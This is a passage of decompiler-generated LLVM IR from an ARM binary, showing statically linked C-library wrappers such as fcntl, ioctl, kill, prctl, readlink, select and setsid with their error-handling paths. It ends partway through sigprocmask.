  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10d44, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10d34, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_10d0c, { 1, 0 }
  uselistorder i32 %v0_10d1c, { 1, 0, 2 }
  uselistorder i32 %v4_10d00, { 1, 0 }
  uselistorder i32 %v1_10d08, { 1, 2, 0 }
  uselistorder i32 %v4_10cf4, { 1, 0 }
  uselistorder i32 %v1_10cfc, { 1, 2, 0 }
  uselistorder i32 %v4_10ce8, { 1, 0 }
  uselistorder i32 %v1_10cf0, { 1, 2, 0 }
  uselistorder i32 %v1_10d14, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_10ce4, { 1, 0 }
  uselistorder i32 %v1_10d10, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_10cd0, { 1, 0 }
  uselistorder i32 %v3_10ccc, { 1, 0 }
  uselistorder i32 %v1_10ccc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_10cd0, { 1, 2, 0, 3 }
  uselistorder i32 %v4_10cbc, { 1, 0 }
  uselistorder i32 %v4_10cb8, { 2, 1, 0 }
  uselistorder i32 %v1_10cbc, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_10cc4.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_10c90, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_10c90, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_10c84, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 65535, { 104, 0, 1, 9, 10, 2, 3, 23, 22, 26, 52, 25, 53, 11, 12, 4, 27, 54, 28, 55, 56, 13, 57, 24, 29, 58, 30, 59, 31, 60, 61, 62, 32, 63, 64, 14, 65, 5, 36, 66, 35, 67, 33, 68, 34, 69, 70, 15, 71, 6, 72, 73, 40, 74, 39, 75, 37, 76, 38, 77, 17, 16, 78, 79, 41, 80, 42, 81, 19, 18, 82, 83, 43, 84, 44, 85, 86, 87, 45, 88, 89, 90, 91, 20, 92, 93, 7, 46, 94, 47, 95, 48, 96, 97, 98, 21, 99, 100, 8, 51, 101, 49, 102, 50, 103 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_10d1c, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_10cd8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10cc4thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10d84 = udiv i32 %arg1, %arg2
  ret i32 %v2_10d84
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_10da0 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_10da0
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_10dbc = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_10dbc, 2
  br i1 %tmp, label %dec_label_pc_10df8, label %dec_label_pc_10dd4

dec_label_pc_10dd4:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_10e2c, label %dec_label_pc_10de8

dec_label_pc_10de8:                               ; preds = %dec_label_pc_10dd4
  %v0_10dec = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_10e20

dec_label_pc_10df8:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_10e14, label %dec_label_pc_10e2c

dec_label_pc_10e14:                               ; preds = %dec_label_pc_10df8
  %v0_10e18 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_10e20

dec_label_pc_10e20:                               ; preds = %dec_label_pc_10de8, %dec_label_pc_10e14
  %storemerge2 = phi i32 [ %v0_10dec, %dec_label_pc_10de8 ], [ %v0_10e18, %dec_label_pc_10e14 ]
  %storemerge.in = load i16, i16* @global_var_21d68.334, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_10e20 = load i32, i32* %r2.global-to-local, align 4
  %v1_10e20 = sub i32 0, %v0_10e20
  store i32 %v1_10e20, i32* %r2.global-to-local, align 4
  %v3_10e24 = add i32 %storemerge, %storemerge2
  %v4_10e24 = inttoptr i32 %v3_10e24 to i32*
  store i32 %v1_10e20, i32* %v4_10e24, align 4
  br label %dec_label_pc_10e2c

dec_label_pc_10e2c:                               ; preds = %dec_label_pc_10dd4, %dec_label_pc_10df8, %dec_label_pc_10e20
  %storemerge1 = phi i32 [ -1, %dec_label_pc_10e20 ], [ %arg1, %dec_label_pc_10df8 ], [ %arg1, %dec_label_pc_10dd4 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 5, 1, 4 }
  uselistorder label %dec_label_pc_10e2c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10e20, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_10e44 = load i32, i32* @r2, align 4
  %v9_10e44 = load i32, i32* @r3, align 4
  store i32 %v9_10e44, i32* %stack_var_-4, align 4
  %v3_10e48 = load i32, i32* @r4, align 4
  store i32 %v3_10e48, i32* %stack_var_-32, align 4
  %v6_10e48 = load i32, i32* @r5, align 4
  %v12_10e48 = load i32, i32* @r7, align 4
  %v4_10e58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 12784) to i32*), align 4
  %v2_10e60 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10e60, i32* @r3, align 4
  %v2_10e64 = icmp eq i32 %v4_10e58, 0
  %v0_10e6c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10e6c, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_10e44, i32* @r4, align 4
  br i1 %v2_10e64, label %dec_label_pc_10e88, label %dec_label_pc_10e7c

dec_label_pc_10e7c:                               ; preds = %entry
  %v7_10e7c = icmp eq i32 %arg2, 7
  br i1 %v7_10e7c, label %dec_label_pc_10ec8, label %bb

bb:                                               ; preds = %dec_label_pc_10e7c
  %v8_10e80 = icmp eq i32 %arg2, 14
  br i1 %v8_10e80, label %dec_label_pc_10ec8, label %dec_label_pc_10e88

dec_label_pc_10e88:                               ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_10e6c, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_10e6c, -4095
  br i1 %tmp, label %dec_label_pc_10ec0, label %dec_label_pc_10ea8

dec_label_pc_10ea8:                               ; preds = %dec_label_pc_10e88
  %v0_10eac = call i32 @__aeabi_read_tp()
  %v3_10eb0 = load i16, i16* @global_var_21d68.334, align 2
  %v4_10eb0 = sext i16 %v3_10eb0 to i32
  store i32 %v4_10eb0, i32* @r3, align 4
  %v0_10eb4 = load i32, i32* @r2, align 4
  %v1_10eb4 = sub i32 0, %v0_10eb4
  store i32 %v1_10eb4, i32* @r2, align 4
  %v3_10eb8 = add i32 %v4_10eb0, %v0_10eac
  %v4_10eb8 = inttoptr i32 %v3_10eb8 to i32*
  store i32 %v1_10eb4, i32* %v4_10eb8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10ec0

dec_label_pc_10ec0:                               ; preds = %dec_label_pc_10e88, %dec_label_pc_10ea8
  %v0_10ec0 = phi i32 [ %v0_10e6c, %dec_label_pc_10e88 ], [ -1, %dec_label_pc_10ea8 ]
  br label %dec_label_pc_10f14

dec_label_pc_10ec8:                               ; preds = %dec_label_pc_10e7c, %bb
  %v0_10ec8 = call i32 @__libc_enable_asynccancel()
  %v0_10ecc = load i32, i32* @r7, align 4
  store i32 %v0_10ecc, i32* @r1, align 4
  store i32 %v0_10ec8, i32* %r6.global-to-local, align 4
  %v0_10ed8 = load i32, i32* @r5, align 4
  store i32 %v0_10ed8, i32* %r0.global-to-local, align 4
  store i32 %v0_10ed8, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_10ed8, -4095
  br i1 %tmp15, label %dec_label_pc_10f08, label %dec_label_pc_10ef0

dec_label_pc_10ef0:                               ; preds = %dec_label_pc_10ec8
  %v1_10ef4 = sub i32 0, %v0_10ed8
  %v0_10ef8 = call i32 @__aeabi_read_tp()
  store i32 %v0_10ef8, i32* %r0.global-to-local, align 4
  %v3_10efc = load i16, i16* @global_var_21d68.334, align 2
  %v4_10efc = sext i16 %v3_10efc to i32
  store i32 %v4_10efc, i32* @r3, align 4
  %v3_10f00 = add i32 %v4_10efc, %v0_10ef8
  %v4_10f00 = inttoptr i32 %v3_10f00 to i32*
  store i32 %v1_10ef4, i32* %v4_10f00, align 4
  store i32 -1, i32* @r2, align 4
  %v0_10f08.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10f08

dec_label_pc_10f08:                               ; preds = %dec_label_pc_10ec8, %dec_label_pc_10ef0
  %v0_10f0c = phi i32 [ %v0_10ed8, %dec_label_pc_10ec8 ], [ -1, %dec_label_pc_10ef0 ]
  %v0_10f08 = phi i32 [ %v0_10ec8, %dec_label_pc_10ec8 ], [ %v0_10f08.pre, %dec_label_pc_10ef0 ]
  store i32 %v0_10f08, i32* %r0.global-to-local, align 4
  store i32 %v0_10f0c, i32* @r7, align 4
  %v1_10f10 = call i32 @__libc_disable_asynccancel(i32 %v0_10f08)
  store i32 %v1_10f10, i32* %r0.global-to-local, align 4
  %v0_10f14.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10f14

dec_label_pc_10f14:                               ; preds = %dec_label_pc_10ec0, %dec_label_pc_10f08
  %v0_10f14 = phi i32 [ %v0_10ec0, %dec_label_pc_10ec0 ], [ %v0_10f14.pre, %dec_label_pc_10f08 ]
  store i32 %v0_10f14, i32* %r0.global-to-local, align 4
  %v2_10f1c = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_10f1c, i32* @r4, align 4
  store i32 %v6_10e48, i32* @r5, align 4
  store i32 %v12_10e48, i32* @r7, align 4
  ret i32 %v0_10f14

; uselistorder directives
  uselistorder i32 %v0_10f14, { 1, 0 }
  uselistorder i32 %v0_10f08, { 1, 0 }
  uselistorder i32 %v0_10ed8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_10e6c, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 2, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_10f14, { 1, 0 }
  uselistorder label %dec_label_pc_10f08, { 1, 0 }
  uselistorder label %dec_label_pc_10ec8, { 1, 0 }
  uselistorder label %dec_label_pc_10ec0, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_10f48 = load i32, i32* @r0, align 4
  ret i32 %v1_10f48
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_10f4c = load i32, i32* @r3, align 4
  store i32 %v9_10f4c, i32* %stack_var_-4, align 4
  %v3_10f50 = load i32, i32* @r4, align 4
  store i32 %v3_10f50, i32* %stack_var_-32, align 4
  %v6_10f50 = load i32, i32* @r5, align 4
  %v12_10f50 = load i32, i32* @r7, align 4
  %v4_10f60 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 12784) to i32*), align 4
  %v2_10f68 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10f68, i32* @r3, align 4
  %v2_10f6c = icmp eq i32 %v4_10f60, 0
  %v0_10f74 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10f74, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_10f6c, label %dec_label_pc_10f84, label %dec_label_pc_10fbc

dec_label_pc_10f84:                               ; preds = %entry
  %tmp = icmp ult i32 %v0_10f74, -4095
  br i1 %tmp, label %dec_label_pc_10fb4, label %dec_label_pc_10f9c

dec_label_pc_10f9c:                               ; preds = %dec_label_pc_10f84
  %v1_10fa0 = sub i32 0, %v0_10f74
  %v3_10fa4 = load i16, i16* @global_var_21d68.334, align 2
  %v4_10fa4 = sext i16 %v3_10fa4 to i32
  store i32 %v4_10fa4, i32* @r3, align 4
  %v0_10fa8 = call i32 @__aeabi_read_tp()
  %v2_10fac = load i32, i32* @r3, align 4
  %v3_10fac = add i32 %v2_10fac, %v0_10fa8
  %v4_10fac = inttoptr i32 %v3_10fac to i32*
  store i32 %v1_10fa0, i32* %v4_10fac, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10fb4

dec_label_pc_10fb4:                               ; preds = %dec_label_pc_10f84, %dec_label_pc_10f9c
  %v0_10fb4 = phi i32 [ %v0_10f74, %dec_label_pc_10f84 ], [ -1, %dec_label_pc_10f9c ]
  br label %dec_label_pc_11008

dec_label_pc_10fbc:                               ; preds = %entry
  %v0_10fbc = call i32 @__libc_enable_asynccancel()
  store i32 %v0_10fbc, i32* %r6.global-to-local, align 4
  %v0_10fcc = load i32, i32* @r4, align 4
  store i32 %v0_10fcc, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_10fcc, -4095
  br i1 %tmp15, label %dec_label_pc_10ffc, label %dec_label_pc_10fe4

dec_label_pc_10fe4:                               ; preds = %dec_label_pc_10fbc
  %v1_10fe8 = sub i32 0, %v0_10fcc
  %v3_10fec = load i16, i16* @global_var_21d68.334, align 2
  %v4_10fec = sext i16 %v3_10fec to i32
  store i32 %v4_10fec, i32* @r3, align 4
  %v0_10ff0 = call i32 @__aeabi_read_tp()
  store i32 %v0_10ff0, i32* %r0.global-to-local, align 4
  %v2_10ff4 = load i32, i32* @r3, align 4
  %v3_10ff4 = add i32 %v2_10ff4, %v0_10ff0
  %v4_10ff4 = inttoptr i32 %v3_10ff4 to i32*
  store i32 %v1_10fe8, i32* %v4_10ff4, align 4
  %v0_10ffc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10ffc

dec_label_pc_10ffc:                               ; preds = %dec_label_pc_10fbc, %dec_label_pc_10fe4
  %v0_11000 = phi i32 [ %v0_10fcc, %dec_label_pc_10fbc ], [ -1, %dec_label_pc_10fe4 ]
  %v0_10ffc = phi i32 [ %v0_10fbc, %dec_label_pc_10fbc ], [ %v0_10ffc.pre, %dec_label_pc_10fe4 ]
  store i32 %v0_10ffc, i32* %r0.global-to-local, align 4
  store i32 %v0_11000, i32* @r7, align 4
  %v1_11004 = call i32 @__libc_disable_asynccancel(i32 %v0_10ffc)
  store i32 %v1_11004, i32* %r0.global-to-local, align 4
  %v0_11008.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11008

dec_label_pc_11008:                               ; preds = %dec_label_pc_10fb4, %dec_label_pc_10ffc
  %v0_11008 = phi i32 [ %v0_10fb4, %dec_label_pc_10fb4 ], [ %v0_11008.pre, %dec_label_pc_10ffc ]
  store i32 %v0_11008, i32* %r0.global-to-local, align 4
  %v2_11010 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11010, i32* @r4, align 4
  store i32 %v6_10f50, i32* @r5, align 4
  store i32 %v12_10f50, i32* @r7, align 4
  ret i32 %v0_11008

; uselistorder directives
  uselistorder i32 %v0_11008, { 1, 0 }
  uselistorder i32 %v0_10ffc, { 1, 0 }
  uselistorder i32 %v0_10fcc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10f74, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_11008, { 1, 0 }
  uselistorder label %dec_label_pc_10ffc, { 1, 0 }
  uselistorder label %dec_label_pc_10fb4, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1102c = load i32, i32* @r7, align 4
  store i32 %v3_1102c, i32* %stack_var_-8, align 4
  %v0_11038 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11038, -4095
  br i1 %tmp, label %dec_label_pc_11058, label %dec_label_pc_11040

dec_label_pc_11040:                               ; preds = %entry
  %v1_11044 = sub i32 0, %v0_11038
  %v3_11048 = load i16, i16* @global_var_21d68.334, align 2
  %v4_11048 = sext i16 %v3_11048 to i32
  %v0_1104c = call i32 @__aeabi_read_tp()
  %v3_11050 = add i32 %v4_11048, %v0_1104c
  %v4_11050 = inttoptr i32 %v3_11050 to i32*
  store i32 %v1_11044, i32* %v4_11050, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11058.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11058

dec_label_pc_11058:                               ; preds = %entry, %dec_label_pc_11040
  %v1_1105c = phi i32 [ %v0_11038, %entry ], [ -1, %dec_label_pc_11040 ]
  %v2_11058 = phi i32 [ %v3_1102c, %entry ], [ %v2_11058.pre, %dec_label_pc_11040 ]
  store i32 %v2_11058, i32* @r7, align 4
  ret i32 %v1_1105c

; uselistorder directives
  uselistorder i32 %v0_11038, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11058, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11064 = load i32, i32* @r4, align 4
  store i32 %v3_11064, i32* %stack_var_-12, align 4
  %v0_11074 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11074, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11074, -4095
  br i1 %tmp, label %dec_label_pc_1109c, label %dec_label_pc_11084

dec_label_pc_11084:                               ; preds = %entry
  %v0_11088 = call i32 @__aeabi_read_tp()
  %v3_1108c = load i16, i16* @global_var_21d68.334, align 2
  %v4_1108c = sext i16 %v3_1108c to i32
  %v0_11090 = load i32, i32* %r2.global-to-local, align 4
  %v1_11090 = sub i32 0, %v0_11090
  store i32 %v1_11090, i32* %r2.global-to-local, align 4
  %v3_11094 = add i32 %v4_1108c, %v0_11088
  %v4_11094 = inttoptr i32 %v3_11094 to i32*
  store i32 %v1_11090, i32* %v4_11094, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1109c.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1109c

dec_label_pc_1109c:                               ; preds = %entry, %dec_label_pc_11084
  %v1_110a0 = phi i32 [ %v0_11074, %entry ], [ -1, %dec_label_pc_11084 ]
  %v2_1109c = phi i32 [ %v3_11064, %entry ], [ %v2_1109c.pre, %dec_label_pc_11084 ]
  store i32 %v2_1109c, i32* @r4, align 4
  ret i32 %v1_110a0

; uselistorder directives
  uselistorder i32 %v0_11074, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1109c, { 1, 0 }
}

define i32 @readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_110a8 = load i32, i32* @r7, align 4
  store i32 %v3_110a8, i32* %stack_var_-8, align 4
  %v0_110b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_110b4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_110b4, -4095
  br i1 %tmp, label %dec_label_pc_110dc, label %dec_label_pc_110c4

dec_label_pc_110c4:                               ; preds = %entry
  %v0_110c8 = call i32 @__aeabi_read_tp()
  %v3_110cc = load i16, i16* @global_var_21d68.334, align 2
  %v4_110cc = sext i16 %v3_110cc to i32
  %v0_110d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_110d0 = sub i32 0, %v0_110d0
  store i32 %v1_110d0, i32* %r2.global-to-local, align 4
  %v3_110d4 = add i32 %v4_110cc, %v0_110c8
  %v4_110d4 = inttoptr i32 %v3_110d4 to i32*
  store i32 %v1_110d0, i32* %v4_110d4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_110dc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_110dc

dec_label_pc_110dc:                               ; preds = %entry, %dec_label_pc_110c4
  %v1_110e0 = phi i32 [ %v0_110b4, %entry ], [ -1, %dec_label_pc_110c4 ]
  %v2_110dc = phi i32 [ %v3_110a8, %entry ], [ %v2_110dc.pre, %dec_label_pc_110c4 ]
  store i32 %v2_110dc, i32* @r7, align 4
  ret i32 %v1_110e0

; uselistorder directives
  uselistorder i32 %v0_110b4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_110dc, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_110e8 = load i32, i32* @r4, align 4
  store i32 %v3_110e8, i32* %stack_var_-12, align 4
  %v0_110f8 = load i32, i32* @r0, align 4
  store i32 %v0_110f8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_110f8, -4095
  br i1 %tmp, label %dec_label_pc_11120, label %dec_label_pc_11108

dec_label_pc_11108:                               ; preds = %entry
  %v0_1110c = call i32 @__aeabi_read_tp()
  %v3_11110 = load i16, i16* @global_var_21d68.334, align 2
  %v4_11110 = sext i16 %v3_11110 to i32
  %v0_11114 = load i32, i32* %r2.global-to-local, align 4
  %v1_11114 = sub i32 0, %v0_11114
  store i32 %v1_11114, i32* %r2.global-to-local, align 4
  %v3_11118 = add i32 %v4_11110, %v0_1110c
  %v4_11118 = inttoptr i32 %v3_11118 to i32*
  store i32 %v1_11114, i32* %v4_11118, align 4
  %v2_11120.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11120

dec_label_pc_11120:                               ; preds = %entry, %dec_label_pc_11108
  %v1_11124 = phi i32 [ %v0_110f8, %entry ], [ -1, %dec_label_pc_11108 ]
  %v2_11120 = phi i32 [ %v3_110e8, %entry ], [ %v2_11120.pre, %dec_label_pc_11108 ]
  store i32 %v2_11120, i32* @r4, align 4
  ret i32 %v1_11124

; uselistorder directives
  uselistorder i32 %v0_110f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11120, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1112c = load i32, i32* @r4, align 4
  store i32 %v3_1112c, i32* %stack_var_-28, align 4
  %v6_1112c = load i32, i32* @r5, align 4
  %v9_1112c = load i32, i32* @r6, align 4
  %v12_1112c = load i32, i32* @r7, align 4
  %v15_1112c = load i32, i32* @r8, align 4
  %v18_1112c = load i32, i32* @sl, align 4
  %v21_1112c = load i32, i32* @lr, align 4
  %v4_1113c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 12784) to i32*), align 4
  %v2_11144 = icmp eq i32 %v4_1113c, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_11144, label %dec_label_pc_11160, label %entry.dec_label_pc_1116c_crit_edge

entry.dec_label_pc_1116c_crit_edge:               ; preds = %entry
  br label %dec_label_pc_1116c

dec_label_pc_11160:                               ; preds = %entry
  store i32 %v3_1112c, i32* @r4, align 4
  store i32 %v9_1112c, i32* @r6, align 4
  store i32 %v12_1112c, i32* @r7, align 4
  store i32 %v15_1112c, i32* @r8, align 4
  store i32 %v18_1112c, i32* %sl.global-to-local, align 4
  %v0_11168 = call i32 @__syscall_select()
  br label %dec_label_pc_1116c

dec_label_pc_1116c:                               ; preds = %entry.dec_label_pc_1116c_crit_edge, %dec_label_pc_11160
  %v0_1116c = call i32 @__libc_enable_asynccancel()
  %v0_11170 = load i32, i32* @r6, align 4
  store i32 %v0_11170, i32* @r1, align 4
  store i32 %v0_1116c, i32* @r5, align 4
  %v0_11180 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_11180, i32* @r0, align 4
  %v0_11188 = call i32 @__syscall_select()
  store i32 %v0_11188, i32* @r4, align 4
  %v0_11190 = load i32, i32* @r5, align 4
  %v1_11194 = call i32 @__libc_disable_asynccancel(i32 %v0_11190)
  %v0_11198 = load i32, i32* @r4, align 4
  %v2_111a0 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_111a0, i32* @r4, align 4
  store i32 %v6_1112c, i32* @r5, align 4
  store i32 %v9_1112c, i32* @r6, align 4
  store i32 %v12_1112c, i32* @r7, align 4
  store i32 %v15_1112c, i32* @r8, align 4
  store i32 %v18_1112c, i32* @sl, align 4
  store i32 %v21_1112c, i32* @lr, align 4
  ret i32 %v0_11198

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1116c, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_111b0 = load i32, i32* @r7, align 4
  store i32 %v3_111b0, i32* %stack_var_-8, align 4
  %v0_111bc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_111bc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_111bc, -4095
  br i1 %tmp, label %dec_label_pc_111e4, label %dec_label_pc_111cc

dec_label_pc_111cc:                               ; preds = %entry
  %v0_111d0 = call i32 @__aeabi_read_tp()
  %v3_111d4 = load i16, i16* @global_var_21d68.334, align 2
  %v4_111d4 = sext i16 %v3_111d4 to i32
  %v0_111d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_111d8 = sub i32 0, %v0_111d8
  store i32 %v1_111d8, i32* %r2.global-to-local, align 4
  %v3_111dc = add i32 %v4_111d4, %v0_111d0
  %v4_111dc = inttoptr i32 %v3_111dc to i32*
  store i32 %v1_111d8, i32* %v4_111dc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_111e4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_111e4

dec_label_pc_111e4:                               ; preds = %entry, %dec_label_pc_111cc
  %v1_111e8 = phi i32 [ %v0_111bc, %entry ], [ -1, %dec_label_pc_111cc ]
  %v2_111e4 = phi i32 [ %v3_111b0, %entry ], [ %v2_111e4.pre, %dec_label_pc_111cc ]
  store i32 %v2_111e4, i32* @r7, align 4
  ret i32 %v1_111e8

; uselistorder directives
  uselistorder i32 %v0_111bc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_111e4, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_111f4 = icmp eq i32* %arg2, null
  br i1 %v2_111f4, label %dec_label_pc_11238, label %dec_label_pc_11208

dec_label_pc_11208:                               ; preds = %entry
  %v2_11208 = load i32, i32* %arg2, align 4
  %v1_1120c = icmp slt i32 %v2_11208, 0
  br i1 %v1_1120c, label %dec_label_pc_11220, label %dec_label_pc_11214

dec_label_pc_11214:                               ; preds = %dec_label_pc_11208
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_11214 = load i32, i32* %.pre3, align 4
